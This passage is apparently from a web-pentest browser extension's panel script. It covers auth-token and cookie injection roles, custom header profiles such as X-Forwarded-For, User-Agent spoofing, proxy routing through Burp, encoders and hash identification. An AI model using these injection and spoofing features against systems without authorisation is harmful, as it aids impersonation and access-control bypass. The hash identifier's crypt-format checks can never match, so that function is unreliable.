      const count  = item.querySelector(':scope > .muted')?.textContent.trim() || '';
      if (domain) lines.push(`**${escMd(domain)}** ${escMd(count)}`.trim());
      const seen = new Set();
      item.querySelectorAll('.recon-spider-line').forEach(l => {
        const url = l.textContent.trim();
        if (!seen.has(url)) { seen.add(url); lines.push(`- ${escMd(url)}`); }
      });
      lines.push('');
      return;
    }

    // ── Generic fallback (forms, hidden fields, source endpoints, etc.) ──
    const text = walkItemNodes(item.childNodes).trim();
    if (text) { lines.push(text); lines.push(''); }
  });

  return lines.join('\n').replace(/\n{3,}/g, '\n\n').trim();
}

function allReconToMarkdown() {
  const sections = Array.from($$('#recon-output .recon-section'));
  if (!sections.length) return '';
  return sections.map(sectionToMarkdown).join('\n\n---\n\n');
}

// ─── Auth ─────────────────────────────────────────────────────────────────────

const Auth = {
  async loadRoles() {
    const { roles = [], activeRoleId = null } = await chrome.storage.local.get(['roles', 'activeRoleId']);
    state.roles = roles;
    state.activeRoleId = activeRoleId;
    this.renderRoles();
  },

  async saveRole() {
    const name   = $('role-name').value.trim();
    const type   = $('role-type').value;
    const token  = $('role-token').value.trim();
    const hName  = $('role-header-name').value.trim();
    const cName  = $('role-cookie-name').value.trim();
    const domain = $('role-domain').value.trim();
    const subdomains = $('role-subdomain').checked;

    if (!name || !token) { toast('Name and token required', 'error'); return; }
    if (type === 'custom' && !hName) { toast('Header name required for custom', 'error'); return; }
    const payload = {
      name, type, token,
      headerName: type === 'custom' ? hName : null,
      cookieName: type === 'cookie' ? (cName || null) : null,
      domain: domain || null,
      subdomains,
    };
    if (state.roleEditId) {
      const i = state.roles.findIndex(r => r.id === state.roleEditId);
      if (i < 0) { toast('Role not found', 'error'); return; }
      const id = state.roles[i].id;
      state.roles[i] = { ...state.roles[i], ...payload, id };
    } else {
      state.roles.push({ id: Date.now(), ...payload });
    }
    await chrome.storage.local.set({ roles: state.roles });
    bg('SYNC_ROLE_MENUS');
    toast(state.roleEditId ? 'Role updated' : 'Role saved', 'success');
    this.cancelEdit();
    this.renderRoles();
  },

  startEdit(id) {
    const r = state.roles.find(x => x.id === id);
    if (!r) return;
    state.roleEditId = id;
    $('role-name').value = r.name;
    $('role-type').value = r.type;
    $('role-token').value = r.token;
    $('role-header-name').value = r.headerName || '';
    $('role-cookie-name').value = r.cookieName || '';
    $('role-domain').value = r.domain || '';
    $('role-subdomain').checked = r.subdomains !== false;
    const t = r.type;
    $('role-header-name').classList.toggle('hidden', t !== 'custom');
    $('role-cookie-name').classList.toggle('hidden', t !== 'cookie');
    $('role-save-btn').textContent = 'Update Role';
    $('role-edit-cancel').classList.remove('hidden');
    $('role-name').focus();
  },

  cancelEdit() {
    state.roleEditId = null;
    $('role-name').value = '';
    $('role-type').value = 'bearer';
    $('role-token').value = '';
    $('role-header-name').value = '';
    $('role-cookie-name').value = '';
    $('role-domain').value = '';
    $('role-subdomain').checked = true;
    $('role-header-name').classList.add('hidden');
    $('role-cookie-name').classList.add('hidden');
    $('role-save-btn').textContent = 'Save Role';
    $('role-edit-cancel').classList.add('hidden');
  },

  renderRoles() {
    const el = $('roles-list');
    if (!state.roles.length) { el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No roles saved</div>'; return; }
    el.innerHTML = state.roles.map(r => {
      const domainLabel = r.domain
        ? `${r.subdomains ? '*.' : ''}${esc(r.domain)}`
        : 'current site';
      return `
      <div class="role-row ${state.activeRoleId === r.id ? 'active-role' : ''}">
        <span class="role-name">${esc(r.name)}</span>
        <span class="role-type">${esc(r.type)}</span>
        <span class="role-domain-label" title="Domain scope">${domainLabel}</span>
        <button class="sm" data-action="edit-role" data-role-id="${r.id}" title="Edit" aria-label="Edit">✎</button>
        <button class="sm primary" data-action="apply-role" data-role-id="${r.id}">Apply</button>
        <button class="sm" data-action="eject-role">Eject</button>
        <button class="sm danger" data-action="del-role" data-role-id="${r.id}">Delete</button>
      </div>`;
    }).join('');
  },

  async applyRole(id) {
    const role = state.roles.find(r => r.id === id);
    if (!role) return;

    const tabDomain = new URL(state.tabUrl).hostname;
    const domain = role.domain || tabDomain;

    if (role.type === 'cookie') {
      const cookieDomain = role.domain || tabDomain;
      const cname = role.cookieName || 'auth';
      const scheme = state.tabUrl.startsWith('https') ? 'https' : 'http';
      const { error } = await bg('REPLACE_NAMED_COOKIE', {
        forUrl: state.tabUrl,
        name: cname,
        cookie: {
          url: `${scheme}://${cookieDomain}/`,
          name: cname,
          value: role.token,
          domain: cookieDomain,
          path: '/',
        },
      });
      if (error) { toast(`Cookie error: ${error.message || error}`, 'error'); return; }
      toast(`Cookie set for ${role.name} → ${cookieDomain}`, 'success');
    } else {
      const headerMap = { bearer: 'Authorization', basic: 'Authorization', custom: role.headerName };
      const headerName = headerMap[role.type] || 'Authorization';
      const tokenVal   = role.type === 'bearer' ? `Bearer ${role.token}`
                       : role.type === 'basic'  ? `Basic ${role.token}`
                       : role.token;
      const { error } = await bg('INJECT_AUTH', { headerName, token: tokenVal, domain });
      if (error) { toast(`Inject error: ${error}`, 'error'); return; }
      const scopeLabel = role.subdomains ? `${domain} + subdomains` : domain;
      toast(`${role.name} applied — ${headerName} → ${scopeLabel}`, 'success');
    }
    state.activeRoleId = id;
    await chrome.storage.local.set({ activeRoleId: id });
    bg('SYNC_ROLE_MENUS');
    this.renderRoles();
  },

  async ejectRole() {
    await bg('EJECT_AUTH');
    state.activeRoleId = null;
    await chrome.storage.local.remove('activeRoleId');
    bg('SYNC_ROLE_MENUS');
    toast('Auth ejected', 'success');
    this.renderRoles();
  },

  async deleteRole(id) {
    if (state.roleEditId === id) this.cancelEdit();
    state.roles = state.roles.filter(r => r.id !== id);
    await chrome.storage.local.set({ roles: state.roles });
    if (state.activeRoleId === id) {
      state.activeRoleId = null;
      await chrome.storage.local.remove('activeRoleId');
    }
    bg('SYNC_ROLE_MENUS');
    this.renderRoles();
  },

  async clearRoles() {
    if (!state.roles.length) return;
    if (!confirm(`Delete all ${state.roles.length} saved roles?`)) return;
    this.cancelEdit();
    state.roles = [];
    state.activeRoleId = null;
    await chrome.storage.local.set({ roles: [] });
    await chrome.storage.local.remove('activeRoleId');
    await this.ejectRole();
    bg('SYNC_ROLE_MENUS');
    this.renderRoles();
  },

};

// ─── Header Profiles ─────────────────────────────────────────────────────────

const HeaderProfiles = {
  profiles: [],
  activeId: null,
  _formRows: [],

  addFormRow(name = '', value = '') {
    const idx = this._formRows.length;
    this._formRows.push({ name, value });
    const row = document.createElement('div');
    row.className = 'hprof-row';
    row.dataset.idx = idx;
    row.innerHTML = `
      <input class="hprof-hname" placeholder="Header name (e.g. X-Forwarded-For)" value="${esc(name)}" autocomplete="off">
      <input class="hprof-hvalue" placeholder="Value" value="${esc(value)}" autocomplete="off">
      <button class="sm danger hprof-remove" type="button" title="Remove">✕</button>`;
    row.querySelector('.hprof-remove').addEventListener('click', () => {
      row.remove();
      this._formRows.splice(idx, 1);
    });
    $('hprof-rows').appendChild(row);
  },

  collectFormRows() {
    return Array.from($('hprof-rows').querySelectorAll('.hprof-row')).map(row => ({
      name:  row.querySelector('.hprof-hname').value.trim(),
      value: row.querySelector('.hprof-hvalue').value.trim(),
    })).filter(h => h.name);
  },

  async saveProfile() {
    const name    = $('hprof-name').value.trim();
    const domain  = $('hprof-domain').value.trim();
    const headers = this.collectFormRows();
    if (!name)          { toast('Profile name required', 'error'); return; }
    if (!headers.length){ toast('Add at least one header', 'error'); return; }
    this.profiles.push({ id: Date.now(), name, domain: domain || null, headers });
    await chrome.storage.local.set({ headerProfiles: this.profiles });
    $('hprof-name').value = '';
    $('hprof-domain').value = '';
    $('hprof-rows').innerHTML = '';
    this._formRows = [];
    bg('SYNC_ROLE_MENUS');
    toast('Header profile saved', 'success');
    this.renderProfiles();
  },

  async applyProfile(id) {
    const profile = this.profiles.find(p => p.id === id);
    if (!profile) return;
    const tabDomain = state.tabUrl ? new URL(state.tabUrl).hostname : '';
    const domain = profile.domain || tabDomain;
    if (!domain) { toast('No domain — navigate to a page first', 'error'); return; }
    const { error } = await bg('INJECT_HEADERS', { headers: profile.headers, domain });
    if (error) { toast(`Header inject error: ${error}`, 'error'); return; }
    this.activeId = id;
    await chrome.storage.local.set({ activeHeaderProfileId: id });
    bg('SYNC_ROLE_MENUS');
    toast(`${profile.name} applied → ${domain}`, 'success');
    this.renderProfiles();
  },

  async ejectProfile() {
    await bg('EJECT_HEADERS');
    this.activeId = null;
    await chrome.storage.local.remove('activeHeaderProfileId');
    bg('SYNC_ROLE_MENUS');
    toast('Header injection ejected', 'success');
    this.renderProfiles();
  },

  async deleteProfile(id) {
    this.profiles = this.profiles.filter(p => p.id !== id);
    await chrome.storage.local.set({ headerProfiles: this.profiles });
    if (this.activeId === id) {
      await bg('EJECT_HEADERS');
      this.activeId = null;
      await chrome.storage.local.remove('activeHeaderProfileId');
    }
    bg('SYNC_ROLE_MENUS');
    this.renderProfiles();
  },

  async loadProfiles() {
    const { headerProfiles = [], activeHeaderProfileId = null } =
      await chrome.storage.local.get(['headerProfiles', 'activeHeaderProfileId']);
    this.profiles = headerProfiles;
    this.activeId = activeHeaderProfileId;
    this.renderProfiles();
  },

  renderProfiles() {
    const el = $('hprof-list');
    if (!this.profiles.length) {
      el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No saved header profiles</div>';
      return;
    }
    el.innerHTML = this.profiles.map(p => {
      const detail = p.headers.map(h => `${h.name}: ${h.value}`).join(', ');
      const truncated = detail.length > 60 ? detail.slice(0, 57) + '…' : detail;
      const domainLabel = p.domain || 'current site';
      return `
        <div class="hprof-profile-row ${this.activeId === p.id ? 'active-hprof' : ''}">
          <span class="hpname">${esc(p.name)}</span>
          <span class="hpdetail" title="${esc(detail)}">${esc(truncated)} <span style="color:var(--yellow)">[${esc(domainLabel)}]</span></span>
          <button class="sm primary" data-action="hprof-apply" data-hpid="${p.id}">Apply</button>
          <button class="sm danger" data-action="hprof-del" data-hpid="${p.id}" title="Delete">✕</button>
        </div>`;
    }).join('');
  },
};

// ─── User-Agent Switcher ──────────────────────────────────────────────────────

const UA_RULE_ID = 2;

const UA_PRESETS = {
  'chrome-win':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.116 Safari/537.36',
  'chrome-mac':       'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.117 Safari/537.36',
  'firefox-win':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0',
  'safari-mac':       'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.4 Safari/605.1.15',
  'edge-win':         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.116 Safari/537.36 Edg/147.0.7727.116',
  'curl':             'curl/8.13.0',
  'iphone-safari':    'Mozilla/5.0 (iPhone; CPU iPhone OS 26_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.4 Mobile/15E148 Safari/604.1',
  'iphone-chrome':    'Mozilla/5.0 (iPhone; CPU iPhone OS 26_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/147.0.7727.116 Mobile/15E148 Safari/604.1',
  'android-chrome':   'Mozilla/5.0 (Linux; Android 16; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.116 Mobile Safari/537.36',
  'samsung-browser':  'Mozilla/5.0 (Linux; Android 16; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/147.0.7727.116 Mobile Safari/537.36',
};

const UserAgent = {
  profiles: [],

  async getActiveUA() {
    const { activeUA = null } = await chrome.storage.local.get(['activeUA']);
    return activeUA;
  },

  async apply() {
    const preset = $('ua-preset').value;
    const custom = $('ua-custom').value.trim();
    const ua = custom || UA_PRESETS[preset];
    if (!ua) { toast('Select a preset or enter a custom UA', 'error'); return; }

    const { error } = await bg('SET_UA', { ua });
    if (error) { toast(`UA error: ${error}`, 'error'); return; }
    await chrome.storage.local.set({ activeUA: ua });
    bg('SYNC_ROLE_MENUS');
    toast('User-Agent applied', 'success');
    this.showStatus(ua);
    this.renderProfiles();
  },

  async reset() {
    const { error } = await bg('CLEAR_UA');
    if (error) { toast(`UA error: ${error}`, 'error'); return; }
    await chrome.storage.local.remove('activeUA');
    bg('SYNC_ROLE_MENUS');
    $('ua-preset').value = '';
    $('ua-custom').value = '';
    $('ua-status').textContent = '';
    $('ua-status').classList.remove('active');
    toast('User-Agent reset to default', 'success');
    this.renderProfiles();
  },

  showStatus(ua) {
    const el = $('ua-status');
    el.textContent = ua;
    el.classList.add('active');
  },

  async loadSaved() {
    const { activeUA } = await chrome.storage.local.get('activeUA');
    if (activeUA) {
      this.showStatus(activeUA);
      const match = Object.entries(UA_PRESETS).find(([, v]) => v === activeUA);
      if (match) $('ua-preset').value = match[0];
      else $('ua-custom').value = activeUA;
    }
  },

  async saveProfile() {
    const name = $('ua-profile-name').value.trim();
    const ua = $('ua-custom').value.trim() || UA_PRESETS[$('ua-preset').value] || '';
    if (!name || !ua) {
      toast('Profile name and UA value required', 'error');
      return;
    }
    this.profiles.push({ id: Date.now(), name, ua });
    await chrome.storage.local.set({ uaProfiles: this.profiles });
    $('ua-profile-name').value = '';
    bg('SYNC_ROLE_MENUS');
    toast('UA profile saved', 'success');
    this.renderProfiles();
  },

  async deleteProfile(id) {
    this.profiles = this.profiles.filter(p => p.id !== id);
    await chrome.storage.local.set({ uaProfiles: this.profiles });
    bg('SYNC_ROLE_MENUS');
    toast('UA profile deleted', 'success');
    this.renderProfiles();
  },

  async applyProfile(id) {
    const profile = this.profiles.find(p => p.id === id);
    if (!profile) return;
    const { error } = await bg('SET_UA', { ua: profile.ua });
    if (error) { toast(`UA error: ${error}`, 'error'); return; }
    await chrome.storage.local.set({ activeUA: profile.ua });
    $('ua-custom').value = profile.ua;
    $('ua-preset').value = '';
    this.showStatus(profile.ua);
    bg('SYNC_ROLE_MENUS');
    toast(`UA profile applied: ${profile.name}`, 'success');
    this.renderProfiles();
  },

  async loadProfiles() {
    const { uaProfiles = [] } = await chrome.storage.local.get(['uaProfiles']);
    this.profiles = uaProfiles;
    this.renderProfiles();
  },

  async renderProfiles() {
    const el = $('ua-profiles-list');
    if (!this.profiles.length) {
      el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No saved UA profiles</div>';
      return;
    }
    const activeUA = await this.getActiveUA();
    el.innerHTML = this.profiles.map(p => `
      <div class="ua-profile-row ${activeUA && activeUA === p.ua ? 'active-ua' : ''}">
        <span class="uname">${esc(p.name)}</span>
        <span class="udetail" title="${esc(p.ua)}">${esc(p.ua)}</span>
        <button class="sm primary" data-action="ua-apply" data-uaid="${p.id}">Apply</button>
        <button class="sm danger" data-action="ua-del" data-uaid="${p.id}" title="Delete" aria-label="Delete">✕</button>
      </div>
    `).join('');
  },
};

// ─── Proxy ────────────────────────────────────────────────────────────────────

const PROXY_PRESETS = {
  direct: null,
  system: null,
  burp:   { host: '127.0.0.1', port: 8080, scheme: 'http' },
};

const Proxy = {
  profiles: [],
  activeMode: 'direct',
  activeProfileId: null,

  buildFixedConfig(scheme, host, port) {
    return {
      mode: 'fixed_servers',
      rules: { singleProxy: { scheme, host, port: parseInt(port, 10) } },
    };
  },

  buildPacConfig(scheme, host, port, includes, excludes) {
    const proxyStr = scheme === 'socks4' || scheme === 'socks5'
      ? `SOCKS5 ${host}:${port}; SOCKS ${host}:${port}`
      : `PROXY ${host}:${port}`;

    const conditions = [];
    if (excludes.length) {
      excludes.forEach(p => {
        conditions.push(`if (shExpMatch(host, ${JSON.stringify(p)})) return "DIRECT";`);
      });
    }
    if (includes.length) {
      const checks = includes.map(p => `shExpMatch(host, ${JSON.stringify(p)})`).join(' || ');
      conditions.push(`if (${checks}) return "${proxyStr}";`);
      conditions.push(`return "DIRECT";`);
    } else {
      conditions.push(`return "${proxyStr}";`);
    }

    const script = `function FindProxyForURL(url, host) {\n  ${conditions.join('\n  ')}\n}`;
    return { mode: 'pac_script', pacScript: { data: script } };
  },

  async applyPreset(mode) {
    this.activeProfileId = null;

    if (mode === 'direct') {
      await bg('CLEAR_PROXY');
    } else if (mode === 'system') {
      await bg('SET_PROXY', { config: { mode: 'system' } });
    } else {
      const p = PROXY_PRESETS[mode];
      const config = this.buildFixedConfig(p.scheme, p.host, p.port);
      const { error } = await bg('SET_PROXY', { config });
      if (error) { toast(`Proxy error: ${error}`, 'error'); return; }
    }

    this.activeMode = mode;
    await this.persist();
    this.updateUI();
    bg('SYNC_ROLE_MENUS');
    toast(`Proxy: ${mode}`, 'success');
  },

  async applyProfile(id) {
    const profile = this.profiles.find(p => p.id === id);
    if (!profile) return;

    const includes = (profile.include || '').split(',').map(s => s.trim()).filter(Boolean);
    const excludes = (profile.exclude || '').split(',').map(s => s.trim()).filter(Boolean);

    let config;
    if (includes.length || excludes.length) {
      config = this.buildPacConfig(profile.scheme, profile.host, profile.port, includes, excludes);
    } else {
      config = this.buildFixedConfig(profile.scheme, profile.host, profile.port);
    }

    const { error } = await bg('SET_PROXY', { config });
    if (error) { toast(`Proxy error: ${error}`, 'error'); return; }

    this.activeMode = 'profile';
    this.activeProfileId = id;
    await this.persist();
    this.updateUI();
    bg('SYNC_ROLE_MENUS');
    toast(`Proxy: ${profile.name}`, 'success');
  },

  async saveProfile() {
    const name    = $('proxy-profile-name').value.trim();
    const scheme  = $('proxy-type').value;
    const host    = $('proxy-host').value.trim();
    const port    = $('proxy-port').value.trim();
    const include = $('proxy-include').value.trim();
    const exclude = $('proxy-exclude').value.trim();

    if (!name || !host || !port) { toast('Name, host, and port required', 'error'); return; }

    this.profiles.push({ id: Date.now(), name, scheme, host, port, include, exclude });
    await chrome.storage.local.set({ proxyProfiles: this.profiles });
    $('proxy-profile-name').value = '';
    $('proxy-host').value = '';
    $('proxy-port').value = '';
    $('proxy-include').value = '';
    $('proxy-exclude').value = '';
    toast('Profile saved', 'success');
    this.renderProfiles();
  },

  async deleteProfile(id) {
    this.profiles = this.profiles.filter(p => p.id !== id);
    await chrome.storage.local.set({ proxyProfiles: this.profiles });
    if (this.activeProfileId === id) {
      await this.applyPreset('direct');
    }
    this.renderProfiles();
  },

  renderProfiles() {
    const el = $('proxy-profiles-list');
    if (!this.profiles.length) {
      el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No saved profiles</div>';
      return;
    }
    el.innerHTML = this.profiles.map(p => `
      <div class="proxy-profile-row ${this.activeProfileId === p.id ? 'active-proxy' : ''}">
        <span class="pname">${esc(p.name)}</span>
        <span class="pdetail">${esc(p.scheme)}://${esc(p.host)}:${esc(p.port)}</span>
        <button class="sm primary" data-action="proxy-apply" data-pid="${p.id}">Apply</button>
        <button class="sm danger" data-action="proxy-del" data-pid="${p.id}" title="Delete" aria-label="Delete">✕</button>
      </div>`
    ).join('');
  },

  updateUI() {
    const bar   = $('proxy-status-bar');
    const icon  = $('proxy-status-icon');
    const text  = $('proxy-status-text');

    $$('.proxy-quick').forEach(b => b.classList.remove('active'));

    if (this.activeMode === 'direct') {
      bar.className = 'proxy-status off';
      icon.textContent = '○';
      text.textContent = 'Direct (no proxy)';
      $('proxy-direct').classList.add('active');
    } else if (this.activeMode === 'system') {
      bar.className = 'proxy-status on';
      icon.textContent = '●';
      text.textContent = 'Using system proxy';
      $('proxy-system').classList.add('active');
    } else if (this.activeMode === 'profile') {
      const p = this.profiles.find(pr => pr.id === this.activeProfileId);
      bar.className = 'proxy-status on';
      icon.textContent = '●';
      text.textContent = p ? `${p.name} — ${p.scheme}://${p.host}:${p.port}` : 'Custom profile';
    } else {
      const preset = PROXY_PRESETS[this.activeMode];
      bar.className = 'proxy-status on';
      icon.textContent = '●';
      text.textContent = `${this.activeMode} — ${preset.host}:${preset.port}`;
      $(`proxy-${this.activeMode}`)?.classList.add('active');
    }

    this.renderProfiles();
  },

  async persist() {
    await chrome.storage.local.set({
      proxyMode: this.activeMode,
      proxyProfileId: this.activeProfileId,
    });
  },

  async loadSaved() {
    const { proxyProfiles = [], proxyMode = 'direct', proxyProfileId = null } =
      await chrome.storage.local.get(['proxyProfiles', 'proxyMode', 'proxyProfileId']);
    this.profiles = proxyProfiles;
    this.activeMode = proxyMode;
    this.activeProfileId = proxyProfileId;
    this.updateUI();
  },
};

// ─── Encode / Decode ─────────────────────────────────────────────────────────

const Encode = {
  encode(type, input) {
    switch (type) {
      case 'base64':    return btoa(unescape(encodeURIComponent(input)));
      case 'base64url': return btoa(unescape(encodeURIComponent(input))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
      case 'url':       return encodeURIComponent(input);
      case 'url-full':  return [...input].map(c => '%' + c.charCodeAt(0).toString(16).padStart(2,'0').toUpperCase()).join('');
      case 'html':      return input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
      case 'hex':       return [...unescape(encodeURIComponent(input))].map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
      case 'unicode':   return [...input].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join('');
      default: return input;
    }
  },

  decode(type, input) {
    try {
      switch (type) {
        case 'base64':
        case 'base64url': {
          const s = input.replace(/-/g,'+').replace(/_/g,'/') + '==='.slice((input.length+3)%4);
          return decodeURIComponent(escape(atob(s)));
        }
        case 'url':     return decodeURIComponent(input.replace(/\+/g,' '));
        case 'url-full':return decodeURIComponent(input);
        case 'html':    return input.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"').replace(/&#x27;/g,"'").replace(/&#(\d+);/g,(_,n)=>String.fromCharCode(+n)).replace(/&#x([0-9a-f]+);/gi,(_,h)=>String.fromCharCode(parseInt(h,16)));
        case 'hex':     return decodeURIComponent(input.replace(/[0-9a-f]{2}/gi, '%$&'));
        case 'unicode': return input.replace(/\\u([0-9a-f]{4})/gi, (_,h) => String.fromCharCode(parseInt(h,16)));
        default: return input;
      }
    } catch (e) {
      return `[Error: ${e.message}]`;
    }
  },
};

// ─── Hash ─────────────────────────────────────────────────────────────────────

function md5(str) {
  function safeAdd(x,y){const l=(x&0xFFFF)+(y&0xFFFF);return(((x>>16)+(y>>16)+(l>>16))<<16)|(l&0xFFFF);}
  function rol(n,s){return(n<<s)|(n>>>(32-s));}
  function cmn(q,a,b,x,s,t){return safeAdd(rol(safeAdd(safeAdd(a,q),safeAdd(x,t)),s),b);}
  function ff(a,b,c,d,x,s,t){return cmn((b&c)|(~b&d),a,b,x,s,t);}
  function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&~d),a,b,x,s,t);}
  function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
  function ii(a,b,c,d,x,s,t){return cmn(c^(b|~d),a,b,x,s,t);}
  function str2blks(s){
    const nb=((s.length+8)>>6)+1,blk=new Array(nb*16).fill(0);
    for(let i=0;i<s.length;i++) blk[i>>2]|=s.charCodeAt(i)<<((i%4)*8);
    blk[s.length>>2]|=0x80<<((s.length%4)*8);
    blk[nb*16-2]=s.length*8;
    return blk;
  }
  const x=str2blks(unescape(encodeURIComponent(str)));
  let [a,b,c,d]=[0x67452301,0xEFCDAB89,0x98BADCFE,0x10325476];
  for(let i=0;i<x.length;i+=16){
    const[aa,bb,cc,dd]=[a,b,c,d];
    a=ff(a,b,c,d,x[i+ 0], 7,-680876936); b=ff(d,a,b,c,x[i+ 1],12,-389564586);
    c=ff(c,d,a,b,x[i+ 2],17, 606105819); d=ff(b,c,d,a,x[i+ 3],22,-1044525330);
    a=ff(a,b,c,d,x[i+ 4], 7,-176418897); b=ff(d,a,b,c,x[i+ 5],12, 1200080426);
    c=ff(c,d,a,b,x[i+ 6],17,-1473231341);d=ff(b,c,d,a,x[i+ 7],22,-45705983);
    a=ff(a,b,c,d,x[i+ 8], 7, 1770035416);b=ff(d,a,b,c,x[i+ 9],12,-1958414417);
    c=ff(c,d,a,b,x[i+10],17,-42063);     d=ff(b,c,d,a,x[i+11],22,-1990404162);
    a=ff(a,b,c,d,x[i+12], 7, 1804603682);b=ff(d,a,b,c,x[i+13],12,-40341101);
    c=ff(c,d,a,b,x[i+14],17,-1502002290);d=ff(b,c,d,a,x[i+15],22, 1236535329);
    a=gg(a,b,c,d,x[i+ 1], 5,-165796510); b=gg(d,a,b,c,x[i+ 6], 9,-1069501632);
    c=gg(c,d,a,b,x[i+11],14, 643717713); d=gg(b,c,d,a,x[i+ 0],20,-373897302);
    a=gg(a,b,c,d,x[i+ 5], 5,-701558691); b=gg(d,a,b,c,x[i+10], 9, 38016083);
    c=gg(c,d,a,b,x[i+15],14,-660478335); d=gg(b,c,d,a,x[i+ 4],20,-405537848);
    a=gg(a,b,c,d,x[i+ 9], 5, 568446438); b=gg(d,a,b,c,x[i+14], 9,-1019803690);
    c=gg(c,d,a,b,x[i+ 3],14,-187363961); d=gg(b,c,d,a,x[i+ 8],20, 1163531501);
    a=gg(a,b,c,d,x[i+13], 5,-1444681467);b=gg(d,a,b,c,x[i+ 2], 9,-51403784);
    c=gg(c,d,a,b,x[i+ 7],14, 1735328473);d=gg(b,c,d,a,x[i+12],20,-1926607734);
    a=hh(a,b,c,d,x[i+ 5], 4,-378558);    b=hh(d,a,b,c,x[i+ 8],11,-2022574463);
    c=hh(c,d,a,b,x[i+11],16, 1839030562);d=hh(b,c,d,a,x[i+14],23,-35309556);
    a=hh(a,b,c,d,x[i+ 1], 4,-1530992060);b=hh(d,a,b,c,x[i+ 4],11, 1272893353);
    c=hh(c,d,a,b,x[i+ 7],16,-155497632); d=hh(b,c,d,a,x[i+10],23,-1094730640);
    a=hh(a,b,c,d,x[i+13], 4, 681279174); b=hh(d,a,b,c,x[i+ 0],11,-358537222);
    c=hh(c,d,a,b,x[i+ 3],16,-722521979); d=hh(b,c,d,a,x[i+ 6],23, 76029189);
    a=hh(a,b,c,d,x[i+ 9], 4,-640364487); b=hh(d,a,b,c,x[i+12],11,-421815835);
    c=hh(c,d,a,b,x[i+15],16, 530742520); d=hh(b,c,d,a,x[i+ 2],23,-995338651);
    a=ii(a,b,c,d,x[i+ 0], 6,-198630844); b=ii(d,a,b,c,x[i+ 7],10, 1127891415);
    c=ii(c,d,a,b,x[i+14],15,-1416354905);d=ii(b,c,d,a,x[i+ 5],21,-57434055);
    a=ii(a,b,c,d,x[i+12], 6, 1700485571);b=ii(d,a,b,c,x[i+ 3],10,-1894986606);
    c=ii(c,d,a,b,x[i+10],15,-1051523);   d=ii(b,c,d,a,x[i+ 1],21,-2054922799);
    a=ii(a,b,c,d,x[i+ 8], 6, 1873313359);b=ii(d,a,b,c,x[i+15],10,-30611744);
    c=ii(c,d,a,b,x[i+ 6],15,-1560198380);d=ii(b,c,d,a,x[i+13],21, 1309151649);
    a=ii(a,b,c,d,x[i+ 4], 6,-145523070); b=ii(d,a,b,c,x[i+11],10,-1120210379);
    c=ii(c,d,a,b,x[i+ 2],15, 718787259); d=ii(b,c,d,a,x[i+ 9],21,-343485551);
    a=safeAdd(a,aa);b=safeAdd(b,bb);c=safeAdd(c,cc);d=safeAdd(d,dd);
  }
  const h=n=>[n&0xFF,(n>>8)&0xFF,(n>>16)&0xFF,(n>>24)&0xFF].map(b=>b.toString(16).padStart(2,'0')).join('');
  return h(a)+h(b)+h(c)+h(d);
}

async function hashString(type, input) {
  if (type === 'md5') return md5(input);
  const alg = { sha1: 'SHA-1', sha256: 'SHA-256', sha384: 'SHA-384', sha512: 'SHA-512' }[type];
  const buf = await crypto.subtle.digest(alg, new TextEncoder().encode(input));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

function identifyHash(h) {
  const s = h.trim();
  const len = s.length;
  const isHex = /^[0-9a-f]+$/i.test(s);
  const isB64 = /^[A-Za-z0-9+/=]+$/.test(s);

  const candidates = [];
  if (isHex) {
    if (len === 32)  candidates.push('MD5', 'NTLM', 'MD4');
    if (len === 40)  candidates.push('SHA-1', 'MySQL 4.1', 'RipeMD-160');
    if (len === 56)  candidates.push('SHA-224');
    if (len === 64)  candidates.push('SHA-256', 'BLAKE2-256');
    if (len === 96)  candidates.push('SHA-384');
    if (len === 128) candidates.push('SHA-512', 'Whirlpool', 'BLAKE2-512');
    if (len === 8)   candidates.push('CRC-32', 'Adler-32');
    if (len === 16)  candidates.push('MD5 (half)', 'CRC-64');
  }
  if (isB64 && !isHex) {
    if (s.startsWith('$2') && s.length === 60) candidates.push('bcrypt');
    if (s.startsWith('{SHA}')) candidates.push('SHA-1 (LDAP)');
    if (s.startsWith('$6$')) candidates.push('SHA-512 crypt');
    if (s.startsWith('$5$')) candidates.push('SHA-256 crypt');
    if (s.startsWith('$1$')) candidates.push('MD5 crypt');
    if (s.startsWith('$apr1$')) candidates.push('MD5 APR');
  }
  if (!candidates.length) {
    if (/^[0-9a-f]+$/i.test(s)) candidates.push(`Hex (${len} chars)`);
    else candidates.push('Unknown / plaintext');
  }
  return candidates;
}

// ─── Context menu ─────────────────────────────────────────────────────────────

function showCtxMenu(x, y, source) {
  state.ctxSource = source;
  const m = $('ctx-menu');
  $('ctx-send-jwt').classList.toggle('hidden', !source?.canSendJwt);
  $('ctx-send-encode').classList.toggle('hidden', !source?.canSendEncode);
  $('ctx-copy-urlencoded').classList.toggle('hidden', !source?.canCopyUrlEncoded);
  m.classList.remove('hidden');
  const pad = 8;
